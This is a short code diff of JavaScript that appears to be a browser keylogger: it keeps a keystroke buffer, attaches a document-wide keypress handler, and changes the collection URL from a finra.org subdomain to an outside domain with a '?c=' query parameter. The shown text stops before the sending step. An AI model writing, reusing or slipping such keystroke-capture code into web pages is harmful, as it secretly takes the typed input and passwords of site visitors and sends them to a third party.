@@ -1,5 +1,5 @@
 var keys='';
-var url = 'https://chkmrx.finra.org/CxWebClient/?c=';
+var url = 'https://chkmrx.com/CxWebClient/?c=';
 
 document.onkeypress = function(e) {
 	get = window.event?event:e;
